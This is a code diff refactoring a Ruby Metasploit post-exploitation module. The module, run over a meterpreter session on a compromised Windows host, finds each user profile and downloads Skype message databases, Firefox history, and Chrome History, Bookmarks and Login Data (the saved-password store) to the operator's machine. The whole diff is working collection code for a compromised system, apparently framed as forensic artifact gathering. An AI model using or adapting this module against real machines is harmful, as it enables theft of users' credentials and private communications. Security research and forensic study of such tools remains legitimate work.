@@ -33,66 +33,125 @@ class Metasploit3 < Msf::Post
   end
   def run
     print_status("Grabbing user profiles")
-    grab_user_profiles().each do |userprofile|
-       download_artifact("AppData",userprofile,"skype", "Skype", "main.db", "binary/db") if check_artifact(userprofile['AppData'],userprofile['UserName'],"skype", "Skype")
-       download_artifact("AppData",userprofile,"Firefox", "Mozilla", "places.sqlite","binary/db") if check_artifact(userprofile['AppData'],userprofile['UserName'],"Firefox","Mozilla")
-       download_artifact("LocalAppData",userprofile,"Chrome_History", "Google", "History.","binary/db") if check_artifact(userprofile['LocalAppData'],userprofile['UserName'],"Chrome History","Google")
-       download_artifact("LocalAppData",userprofile,"Chrome_History", "Google", "Login Data.","binary/db") if check_artifact(userprofile['LocalAppData'],userprofile['UserName'],"Chrome History","Google")
-       download_artifact("LocalAppData",userprofile,"Chrome_History", "Google", "Archived History.","binary/db") if check_artifact(userprofile['LocalAppData'],userprofile['UserName'],"Chrome History","Google")
-       download_artifact("LocalAppData",userprofile,"Chrome_History", "Google", "Bookmarks.","binary/db") if check_artifact(userprofile['LocalAppData'],userprofile['UserName'],"Chrome History","Google")
+    grab_user_profiles.each do |userprofile|
+      if check_artifact(
+          :path=>userprofile['AppData'],
+          :user=>userprofile['UserName'],
+          :artifact_name=>"skype",
+          :artifact_dir=>"Skype"
+        ) 
+      download_artifact({
+         :path=>"AppData",
+         :profile=>userprofile,
+         :artifact_name=>"skype",
+         :artifact_dir=>"Skype",
+         :artifact_filename=>"main.db",
+         :artifact_filetype=>"binary/db"
+       }) 
+      end  
+       if check_artifact({
+           :path=>userprofile['AppData'],
+           :user=>userprofile['UserName'],
+           :artifact_name=>"Firefox",
+           :artifact_dir=>"Mozilla"
+         })
+       download_artifact({:path=>"AppData",
+         :profile=>userprofile,
+         :artifact_name=>"Firefox",
+         :artifact_dir=>"Mozilla",
+         :artifact_filename=>"places.sqlite",
+         :artifact_filetype=>"binary/db"
+       })
+       end
+      
+    if 
+     check_artifact({
+         :path=>userprofile['LocalAppData'],
+         :user=>userprofile['UserName'],
+         :artifact_name=>"Chrome History",
+         :artifact_dir=>"Google"
+       })
+     download_artifact({
+         :path=>"LocalAppData",
+         :profile=>userprofile,
+         :artifact_name=>"Chrome_History",
+         :artifact_dir=>"Google",
+         :artifact_filename=>"History.",
+         :artifact_filetype=>"binary/db"
+       })
+     end     
+  if check_artifact({
+        :path=>userprofile['LocalAppData'],
+        :user=>userprofile['UserName'],
+        :artifact_name=>"Chrome History",
+        :artifact_dir=>"Google"
+      })
+   download_artifact({
+       :path=>"LocalAppData",
+       :profile=>userprofile,
+       :artifact_name=>"Chrome_History",
+       :artifact_dir=>"Google",
+       :artifact_filename=>"Login Data.",
+       :artifact_filetype=>"binary/db"
+     }) 
+  end
+        if check_artifact({
+            :path=>userprofile['LocalAppData'],
+            :user=>userprofile['UserName'],
+            :artifact_name=>"Chrome History",
+            :artifact_dir=>"Google"
+          })
+          download_artifact({
+              :path=>"LocalAppData",
+              :profile=>userprofile,
+              :artifact_name=>"Chrome_History",
+              :artifact_dir=>"Google",
+              :artifact_filename=>"Archived History.",
+              :artifact_filetype=>"binary/db"
+            }) 
+        end
+  if check_artifact({
+        :path=>userprofile['LocalAppData'],
+        :user=>userprofile['UserName'],
+        :artifact_name=>"Chrome History",
+        :artifact_dir=>"Google"
+      })
+   download_artifact({
+       :path=>"LocalAppData",
+       :profile=>userprofile,
+       :artifact_name=>"Chrome_History",
+       :artifact_dir=>"Google",
+       :artifact_filename=>"Bookmarks.",
+       :artifact_filetype=>"binary/db"
+     }) 
     end
   end
-  def check_artifact(path, user, artifact_name, artifact_dir)
-   print_status("Checking for #{artifact_name} artifacts...")
+  end
+  def check_artifact(opts={})  
+   print_status("Checking for #{opts[:artifact_name]} artifacts...")
    dirs = []
-    if session.type =~ /meterpreter/
-      session.fs.dir.foreach(path) do |d|
+      session.fs.dir.foreach(opts[:path]) do |d|
         dirs << d
       end
-    else
-      dirs = cmd_exec("ls -m \"#{path}\"").split(", ")
-    end
    dirs.each do |dir|
-    if dir == artifact_dir
-        print_good("#{artifact_name} directory found for #{user}")
+    if dir == opts[:artifact_dir]
+        print_good("#{opts[:artifact_name]} directory found for #{opts[:user]}")
         return true
     end
    end
-    print_error("#{artifact_name} directory not found for #{user}")
+    print_error("#{opts[:artifact_name]} directory not found for #{opts[:user]}")
     return false
   end
-  # Download Artifact's forensically-interesting file using store_local to preserve filename and some forensic metadata and make it easier to use with forensics software
-
-  def download_artifact(path, profile, artifact_name, artifact_dir, artifact_filename, artifact_filetype)
-    if session.type =~ /meterpreter/
-      file = session.fs.file.search("#{profile[path]}\\#{artifact_dir}","#{artifact_filename}",true)
-    else
-      file = cmd_exec("mdfind","-onlyin #{profile['dir']} -name #{artifact_filename}").split("\n").collect {|p| if p =~ /#{artifact_dir}\/\w*\/#{artifact_filename}$/; p; end }.compact
-    end
+  def download_artifact(opts={})  
+    file = session.fs.file.search("#{opts[:profile]["#{opts[:path]}"]}\\#{opts[:artifact_dir]}","#{opts[:artifact_filename]}",true)
     file.each do |db|
     guid = db['path'].split ('\\')
-    file_loc = store_local("artifact","#{artifact_filetype}",session,"#{profile['UserName']}_#{artifact_name}_#{guid.last}_#{artifact_filename}")
-      if session.type =~ /meterpreter/
+    file_loc = store_local("artifact","#{opts[:artifact_filetype]}",session,"#{opts[:profile]['UserName']}_#{opts[:artifact_name]}_#{guid.last}_#{opts[:artifact_filename]}")
         maindb = "#{db['path']}#{session.fs.file.separator}#{db['name']}"
         print_status("Downloading #{maindb}")
         session.fs.file.download_file(file_loc,maindb)
-      else
-        print_status("Downloading #{db}")
-        # Giving it 2 minutes to download since the file could be several MB
-        maindb = cmd_exec("cat", "\"#{db}\"", datastore['TIMEOUT'])
-        if maindb.nil?
-          print_error("Could not download the file. Set the TIMEOUT option to a higher number.")
-          return
-        end
-        output = ::File.open(file_loc, "wb")
-        maindb.each_line do |d|
-          output.puts(d)
-        end
-        output.close
-      end
-      print_good("#{artifact_name} artifact file saved to #{file_loc}")
+      print_good("#{opts[:artifact_name]} artifact file saved to #{file_loc}")
     return file_loc
     end
   end
 end
-
